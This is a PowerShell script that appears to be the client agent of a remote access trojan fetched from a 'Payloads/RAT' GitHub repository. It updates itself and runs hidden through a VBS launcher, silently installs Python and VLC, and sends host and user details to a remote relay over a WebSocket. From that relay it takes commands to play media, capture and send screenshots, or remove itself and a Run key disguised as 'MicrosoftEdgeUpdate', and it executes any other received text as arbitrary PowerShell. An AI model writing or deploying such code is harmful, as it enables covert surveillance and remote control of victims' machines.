$versionUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/refs/heads/main/RAT/version.json"
$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$playerPath = Join-Path $scriptDir "player.py"


$remote = Invoke-RestMethod -Uri $versionUrl

$localPath = Join-Path $scriptDir "version.json"

##### Updates #####

if (Test-Path $localPath) {
    $local = Get-Content $localPath | ConvertFrom-Json
} else {
    $local = @{ agent_version = "0.0"; files = @() }
}

$agentPath = Join-Path $scriptDir "agent.ps1"
$vbsPath = Join-Path $scriptDir "launcher.vbs"

if ($remote.agent_version -ne $local.agent_version) {
    Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $scriptDir "agent.ps1")

    foreach ($remoteFile in $remote.files) {
        $localFile = $local.files | Where-Object { $_.name -eq $remoteFile.name }
        if (-not $localFile -or $localFile.version -ne $remoteFile.version) {
            $destPath = Join-Path $scriptDir $remoteFile.name
            $destDir = Split-Path $destPath -Parent
            if (-not (Test-Path $destDir)) {
                New-Item -ItemType Directory -Force -Path $destDir
            }
            Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile $destPath
        }
    }
    $remote | ConvertTo-Json | Set-Content $localPath

@"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
"@ | Set-Content $vbsPath

    Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
    exit
}

foreach ($remoteFile in $remote.files) {
    $localFile = $local.files | Where-Object { $_.name -eq $remoteFile.name }
    if (-not $localFile -or $localFile.version -ne $remoteFile.version) {
        $destPath = Join-Path $scriptDir $remoteFile.name
        $destDir = Split-Path $destPath -Parent
        if (-not (Test-Path $destDir)) {
            New-Item -ItemType Directory -Force -Path $destDir
        }
        Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile $destPath
    }
}
$remote | ConvertTo-Json | Set-Content $localPath

try {
    $pythonVersion = & python --version 2>$null
    $pythonInstalled = $LASTEXITCODE -eq 0
} catch {
    $pythonInstalled = $false
}

if (-not $pythonInstalled) {
    $pythonInstaller = Join-Path $env:TEMP "python_installer.exe"
    if ([Environment]::Is64BitOperatingSystem) {
        $pythonUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
    } else {
        $pythonUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9.exe"
    }
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
    Start-Process $pythonInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 SimpleInstall=1 Include_launcher=0 LauncherAllUsers=0" -Wait
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "User") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "Machine")

    Remove-Item $pythonInstaller -Force
}

python -m pip install python-vlc "pycaw==20230322" comtypes --quiet --exists-action i

$vlcDir = Join-Path $scriptDir "vlc"

if (-not (Test-Path $vlcDir)) {
    $vlcZip = Join-Path $env:TEMP "vlc.zip"
    Invoke-WebRequest -Uri "https://download.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.zip" -OutFile $vlcZip
    Expand-Archive -Path $vlcZip -DestinationPath $env:TEMP -Force
    Move-Item -Path (Join-Path $env:TEMP "vlc-3.0.20") -Destination $vlcDir
    Remove-Item $vlcZip
}

##### Main #####

$infos = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    serial = (Get-WmiObject Win32_BIOS).SerialNumber
}

$json = $infos | ConvertTo-Json

$ws = New-Object System.Net.WebSockets.ClientWebSocket

$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
$config = Invoke-RestMethod -Uri $configUrl
$uri = [System.Uri]"$($config.relay_url)/ws"

$token = [System.Threading.CancellationToken]::None

$task = $ws.ConnectAsync($uri, $token)
$task.Wait()

$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$segment = [System.ArraySegment[byte]]::new($bytes)
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()

$buffer = [byte[]]::new(1048576)
$segment = [System.ArraySegment[byte]]::new($buffer)

while ($ws.State -eq "Open") {
    $result = $ws.ReceiveAsync($segment, $token)
    $result.Wait()
    $message = [System.Text.Encoding]::UTF8.GetString($segment.Array, 0, $result.Result.Count)
    
    if ($message.Trim() -ne "") {
        try {
            $cmd = $message | ConvertFrom-Json

            if ($cmd.type -eq "play_video" -or $cmd.type -eq "play_sound") {
                if ($cmd.type -eq "play_video") {
                    $mode = "video"
                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp4"
                } else {
                    $mode = "sound"
                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp3"
                }

                Start-Process python -ArgumentList "$playerPath --file `"$filePath`" --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
            }

            elseif ($cmd.type -eq "kill") {
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
                    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
                }
                Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
                exit
            }

            elseif ($cmd.type -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                if (-not ([System.Management.Automation.PSTypeName]'DPI').Type) {
                    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DPI {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
                }
                [DPI]::SetProcessDPIAware()

                $bounds = [System.Drawing.Rectangle]::Empty
                foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
                    $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.Bounds)
                }
                $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

                $ms = New-Object System.IO.MemoryStream
                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                $bytes = $ms.ToArray()
                $base64 = [Convert]::ToBase64String($bytes)
                $chunkSize = 500000
                $chunks = [Math]::Ceiling($base64.Length / $chunkSize)

                for ($i = 0; $i -lt $chunks; $i++) {
                    $chunk = $base64.Substring($i * $chunkSize, [Math]::Min($chunkSize, $base64.Length - $i * $chunkSize))
                    $payload = @{ 
                        type = "screenshot_chunk"
                        data = $chunk
                        index = $i
                        total = $chunks
                    } | ConvertTo-Json
                    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
                    $payloadSegment = [System.ArraySegment[byte]]::new($payloadBytes)
                    $ws.SendAsync($payloadSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
                }
            }

        } catch {
            $output = Invoke-Expression $message
            $outputString = $output | Out-String
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($outputString)
            $segment_out = [System.ArraySegment[byte]]::new($bytes)
            $ws.SendAsync($segment_out, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
        }
    }
}
